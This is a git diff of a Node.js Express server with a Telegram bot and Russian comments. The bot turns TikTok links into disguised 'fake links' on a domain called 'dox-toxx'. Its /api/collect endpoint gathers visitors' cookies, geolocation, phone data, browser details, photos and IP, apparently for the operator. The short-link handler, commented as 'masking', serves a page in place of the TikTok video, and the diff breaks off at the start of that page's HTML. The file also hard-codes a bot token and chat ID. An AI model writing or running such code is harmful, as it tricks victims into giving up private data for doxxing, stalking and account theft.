@@ -5,7 +5,9 @@ const crypto = require('crypto');
 const TOKEN = '8989024516:AAEAIwKbvaDe8HALbrjv-UoHcH6Pp2wZiso';
 const CHAT_ID = '8667961334';
 const PORT = process.env.PORT || 3000;
-const DOMAIN = process.env.DOMAIN || 'https://dox-toxx.onrender.com';
+
+// Ваш реальный домен на Render (БЕЗ слэша на конце)
+const DOMAIN = 'https://dox-toxx.onrender.com'; 
 
 const app = express();
 const bot = new TelegramBot(TOKEN, { polling: true });
@@ -16,10 +18,11 @@ app.use(express.urlencoded({ extended: true }));
 const linksDB = {};
 const userStates = {};
 
+// БОТ
 bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
   userStates[chatId] = 'WAITING_LINK';
-  bot.sendMessage(chatId, 'Отправь ссылку на TikTok.');
+  bot.sendMessage(chatId, 'Отправь ссылку на TikTok (например: https://www.tiktok.com/@user/video/123456789).');
 });
 
 bot.on('message', (msg) => {
@@ -30,19 +33,25 @@ bot.on('message', (msg) => {
 
   if (userStates[chatId] === 'WAITING_LINK') {
     if (!text.includes('tiktok.com')) {
-      return bot.sendMessage(chatId, 'Неверная ссылка.');
+      return bot.sendMessage(chatId, 'Неверная ссылка. Отправь ссылку с tiktok.com');
     }
 
-    const shortId = crypto.randomBytes(6).toString('base64').replace(/\+/g, '').replace(/\//g, '').replace(/=/g, '').substring(0, 9);
+    const shortId = crypto.randomBytes(4).toString('hex'); // Генерируем короткий ID
     linksDB[shortId] = text;
 
     const fakeLink = `${DOMAIN}/${shortId}/`;
 
-    bot.sendMessage(chatId, `Ссылка: ${fakeLink}`);
+    bot.sendMessage(chatId, `Ссылка готова:\n${fakeLink}`);
     userStates[chatId] = null;
   }
 });
 
+// ГЛАВНАЯ СТРАНИЦА (Чтобы не было ошибки Cannot GET /)
+app.get('/', (req, res) => {
+  res.send('Сервер работает. Бот ожидает ссылки в Telegram.');
+});
+
+// ПРИЕМ ДАННЫХ С ФРОНТЕНДА
 app.post('/api/collect', async (req, res) => {
   const { cookies, geo, phone, browser, target, photo } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -59,16 +68,19 @@ app.post('/api/collect', async (req, res) => {
 
     res.json({ ok: true });
   } catch (error) {
+    console.error(error);
     res.status(500).json({ ok: false });
   }
 });
 
+// ОБРАБОТКА КОРОТКИХ ССЫЛОК (Маскировка)
 app.get('/:id/', (req, res) => {
   const shortId = req.params.id;
   const targetUrl = linksDB[shortId];
 
+  // Если ID нет в базе (например, после перезапуска сервера) — кидаем на главную TikTok
   if (!targetUrl) {
-    return res.redirect('https://dox-toxx.onrender.com');
+    return res.redirect('https://www.tiktok.com/');
   }
 
   res.send(`<!DOCTYPE html>
